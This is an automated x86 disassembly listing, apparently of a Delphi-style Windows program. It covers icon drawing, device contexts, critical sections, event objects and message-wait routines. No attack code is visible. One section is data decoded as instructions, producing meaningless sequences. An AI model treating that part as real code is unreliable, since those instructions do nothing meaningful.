pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_3a8fd6c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax esi
call sub_3a8a41c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3a8fdc8
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_3a8fe04
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_3a7cbbc
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_3a7cdc8
movzx eax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_3a8b190
jmp r-xdata
jmp r-xdata
call sub_3a8a630
sub_3a8fe7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8ff09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_3a8fdc8
cmp eax [ rw-data ]
jne r-xdata
call sub_3a8a630
mov eax esi
call sub_3a8fdc8
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_3a8b6e0
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_3a63a44
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_3a7ce00
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3a8ff30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8ffbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_3a7cb9c
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_3a7cdc8
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_3a7cdc8
movzx eax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_3a8ffe8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_3a8a630
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8ffc3
mov eax [ ebp - 0x4 ]
call sub_3a64380
call sub_3a64c5c
call sub_3a64cb0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8ffe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a90028
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a8d75c
mov eax [ ebx + 0x28 ]
call sub_3a8d760
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9005c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp [ esi + 0x4 ] 0x1
jle r-xdata
mov edi [ esi + 0x8 ]
xor eax eax
mov [ esi + 0x8 ] eax
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
call CopyIcon
mov edx eax
xor ecx ecx
mov eax ebx
call sub_3a8ffe8
sub_3a90098
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a8ffe8
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetIconInfo
test eax eax
je r-xdata
xor edx edx
push ebp
push sub_3a90115
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x30 ]
push eax
push 0x18
mov eax [ ebp - 0x8 ]
push eax
call GetObjectA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x2c ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0x2c ]
mov [ eax + 0x14 ] edx
sub_3a90180
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a8fe7c
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_3a7ce00
pop esi
pop ebx
retn
sub_3a901d0
push ebp
mov ebp esp
push ecx
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a90215
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5a
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9021c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
sub_3a90234
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
movzx ebx [ esp + 0x34 ]
sub_3a90278
push ebp
mov ebp esp
add esp 0xfffffef8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a9037b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a86f20
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a90333
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
call sub_3a86fc0
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a87024
test al al
je r-xdata
call sub_3a90234
cmp al 0x80
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9033a
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a8726c
mov eax [ ebp - 0x8 ]
call sub_3a86f90
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a65338
sub_3a9033a
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a90382
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea eax [ ebp - 0x108 ]
mov edx [ ebp - 0x4 ]
mov ecx 0xff
call sub_3a6553c
lea edx [ ebp - 0x108 ]
mov eax rw-data
mov cl 0x1f
call sub_3a63934
sub_3a90454
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9048c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3a90684
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a904d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a904b8
xor eax eax
push ebp
push sub_3a90571
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a90578
mov eax [ ebp - 0x4 ]
call sub_3a904c4
retn
mov eax 0x10
call sub_3a62ee0
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a90584
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_3a90584
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a90663
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_3a8e7d8
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_3a89c5c
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_3a89b20
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_3a78e1c
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_3a89f04
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_3a8a2f8
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_3a8e494
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a90684
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_3a904b8
xor eax eax
push ebp
push sub_3a906d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a906d8
mov eax [ ebp - 0x4 ]
call sub_3a904c4
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a906d8
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a62efc
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov eax esi
call sub_3a64380
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_3a904b8
xor eax eax
push ebp
push sub_3a906d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a906d8
mov eax [ ebp - 0x4 ]
call sub_3a904c4
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a90704
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_3a88d54
push eax
mov eax ebx
call sub_3a88d54
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_3a904d0
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_3a9073c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a90805
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9080c
retn
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
call sub_3a64380
call sub_3a8d440
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_3a65e38
sub_3a90810
pop esp
or [ ecx + 0x3 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx - 0x57 ] ah
add eax [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add eax [ esp + ecx - 0x57 ]
add ecx [ eax + 0xc ]
test eax 0x53540e03
jns r-xdata
arpl [ gs : ebx + ecx * 4 - 0x40 ] si
sub [ ecx ] cl
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx ] dh
test eax 0x1003
add [ eax + ecx - 0x57 ] dh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x4403a90c ]
or al 0xa9
add ecx [ eax + 0xc ]
test eax 0xa90cc003
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x40 ] si
or [ ecx + 0x3 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
or [ ecx + 0x1003 ] ch
add [ eax ] dl
or [ ecx - 0x59ba37fd ] ch
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x4403a90c ]
or al 0xa9
add ecx [ eax + 0xc ]
test eax 0xa90cc003
add ecx [ 0x6e614854 ]
outsb
je r-xdata
outsb
je r-xdata
add eax [ esi ]
push esp
inc ebp
jbe r-xdata
add eax eax
or al 0xa9
inc eax
add al dh
or [ ecx + 0x3 ] ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
or [ ecx + 0x1c03 ] ebp
add [ eax ] dl
or [ ecx - 0x59ba37fd ] ch
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ecx [ esi + ecx - 0x57 ]
add edi [ esi + ecx - 0x57 ]
add ecx [ eax + 0x1003a90e ]
push esp
inc ebx
jb r-xdata
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or eax 0x6e614854
mov [ ecx ] cl
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx + 0x1003a9 ] dl
add [ eax ] al
fmul [ eax ]
test eax 0xa645c803
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x4403a90c ]
or al 0xa9
add ecx [ eax + 0xc ]
test eax 0xa90cc003
add ecx [ esp + edx * 2 ]
push ebx
imul ebp [ ebp + 0x70 ] 0x7645656c
mov [ eax + 0x10 ] ebx
je r-xdata
call sub_3a672cc
mov eax [ eax + 0x10 ]
pop edi
pop esi
pop ebx
retn
push 0x0
call sub_3a672cc
mov eax [ eax + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
mov edi eax
call GetCurrentThreadId
cmp edi eax
jne r-xdata
call sub_3a672cc
mov ebx [ eax + 0x10 ]
call sub_3a672cc
cmp [ eax + 0x10 ] 0x0
je r-xdata
adc [ eax ] al
add [ eax ] al
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
push 0x0
push r-xdata
push ebx
push esi
call FindWindowExA
mov ebx eax
call sub_3a672cc
sub_3a90a0c
push ebx
push esi
push edi
call sub_3a672cc
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
call sub_3a672cc
mov eax [ eax + 0x10 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor esi esi
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
call sub_3a672cc
mov eax [ eax + 0x10 ]
pop edi
pop esi
pop ebx
retn
push 0x0
call sub_3a672cc
mov eax [ eax + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
mov edi eax
call GetCurrentThreadId
cmp edi eax
jne r-xdata
mov esi 0xfffffffd
jmp r-xdata
push 0x0
push r-xdata
push ebx
push esi
call FindWindowExA
mov ebx eax
call sub_3a672cc
mov [ eax + 0x10 ] ebx
call sub_3a672cc
mov ebx [ eax + 0x10 ]
call sub_3a672cc
cmp [ eax + 0x10 ] 0x0
je r-xdata
xor ebx ebx
sub_3a90aca
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
call sub_3a90a0c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edi 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp + 0xc ]
push eax
test edi 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call WaitForMultipleObjectsEx
mov ebx eax
push edi
push 0xbf
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call MsgWaitForMultipleObjectsEx
mov ebx eax
lea eax [ esi ]
cmp ebx eax
jne r-xdata
cmp ebx 0xc0
jne r-xdata
mov eax 0x8001011f
jmp r-xdata
cmp ebx 0x102
jne r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor eax eax
cmp ebx 0x80
jb r-xdata
mov eax 0x80010115
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
lea eax [ ebp - 0x20 ]
push eax
call TranslateMessage
lea eax [ ebp - 0x20 ]
push eax
call DispatchMessageA
jmp r-xdata
sub ebx 0x0
mov edx [ ebp + 0x18 ]
mov [ edx ] ebx
add esi 0x80
cmp ebx esi
jae r-xdata
sub ebx 0x80
mov edx [ ebp + 0x18 ]
mov [ edx ] ebx
jmp r-xdata
sub_3a90bb0
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov [ rw-data ] r-xdata
sub_3a90c10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push ebx
call [ rw-data ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_3a90bb0
sub_3a90c4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
mov [ esi + 0xc ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a90c90
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
push eax
call CloseHandle
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a90cc0
push ebx
push esi
push ecx
mov esi eax
cmp [ esi + 0xc ] 0x0
je r-xdata
push edx
mov eax [ esi + 0x4 ]
push eax
call WaitForSingleObject
sub eax 0xffffffff
je r-xdata
lea eax [ esi + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx 0x1
xor eax eax
call sub_3a90c10
sub eax 0x80010115
je r-xdata
mov bl 0x3
call GetLastError
mov [ esi + 0x8 ] eax
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
sub eax 0xa
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
sub eax 0x80
je r-xdata
sub eax 0x7ffefee1
jne r-xdata
mov bl 0x2
jmp r-xdata
sub eax 0x82
je r-xdata
mov bl 0x3
call GetLastError
mov [ esi + 0x8 ] eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
jmp r-xdata
mov bl 0x3
sub_3a90d4c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_3a90c4c
mov eax [ ebp + 0xc ]
call sub_3a65730
push eax
cmp [ ebp + 0x10 ] 0x1
cmc
sbb eax eax
push eax
cmp [ ebp + 0x14 ] 0x1
cmc
sbb eax eax
push eax
push esi
call CreateEventA
mov [ edi + 0x4 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a90db4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x1
push 0x0
push 0x0
push ecx
xor edx edx
mov eax esi
xor ecx ecx
call sub_3a90d4c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a90e0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a90e4c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a90ea4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
